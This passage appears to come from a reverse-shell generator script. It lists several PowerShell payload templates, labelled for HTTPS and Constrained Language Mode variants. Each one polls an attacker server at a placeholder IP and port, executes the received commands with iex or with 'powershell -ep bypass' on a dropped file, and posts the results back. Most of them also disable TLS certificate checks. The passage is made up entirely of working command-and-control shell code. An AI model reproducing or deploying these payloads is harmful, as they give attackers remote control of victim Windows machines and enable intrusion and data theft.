\$s='${IPADDR}:${PORT}';\$i='1cdbb583-f96894ff-f99b8edc';\$p='https://';\$v=Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/1cdbb583 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/f96894ff -Headers @{\"Authorization\"=\$i});if (\$c -ne 'None') {\$r=iex \$c -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=Invoke-RestMethod -Uri \$p\$s/f99b8edc -Method POST -Headers @{\"Authorization\"=\$i} -Body ([System.Text.Encoding]::UTF8.GetBytes(\$e+\$r) -join ' ')} sleep 0.8}"
	# PowerShell Constr Lang Mode IEX https
	"add-type @\"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
\"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
\$s='${IPADDR}:${PORT}';\$i='11e6bc4b-fefb1eab-68a9612e';\$p='https://';\$v=Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/11e6bc4b -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/fefb1eab -Headers @{\"Authorization\"=\$i});if (\$c -ne 'None') {\$r=iex \$c -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=Invoke-RestMethod -Uri \$p\$s/68a9612e -Method POST -Headers @{\"Authorization\"=\$i} -Body (\$e+\$r)} sleep 0.8}"
	# PowerShell Outfile https
	"add-type @\"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
\"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
\$s='${IPADDR}:${PORT}';\$i='add29918-6263f3e6-2f810c1e';\$p='https://';\$f=\"C:Users\$env:USERNAME.localhack.ps1\";\$v=Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/add29918 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/6263f3e6 -Headers @{\"Authorization\"=\$i});if (\$c -eq 'exit') {del \$f;exit} elseif (\$c -ne 'None') {echo \"\$c\" | out-file -filepath \$f;\$r=powershell -ep bypass \$f -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=Invoke-RestMethod -Uri \$p\$s/2f810c1e -Method POST -Headers @{\"Authorization\"=\$i} -Body ([System.Text.Encoding]::UTF8.GetBytes(\$e+\$r) -join ' ')} sleep 0.8}"
	# PowerShell Outfile Constr Lang Mode https
	"add-type @\"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
\"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
\$s='${IPADDR}:${PORT}';\$i='e030d4f6-9393dc2a-dd9e00a7';\$p='https://';\$f=\"C:Users\$env:USERNAME.localhack.ps1\";\$v=IRM -UseBasicParsing -Uri \$p\$s/e030d4f6 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(IRM -UseBasicParsing -Uri \$p\$s/9393dc2a -Headers @{\"Authorization\"=\$i}); if (\$c -eq 'exit') {del \$f;exit} elseif (\$c -ne 'None') {echo \"\$c\" | out-file -filepath \$f;\$r=powershell -ep bypass \$f -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=IRM -Uri \$p\$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=\$i} -Body (\$e+\$r)} sleep 0.8}"
)


socket
genShell
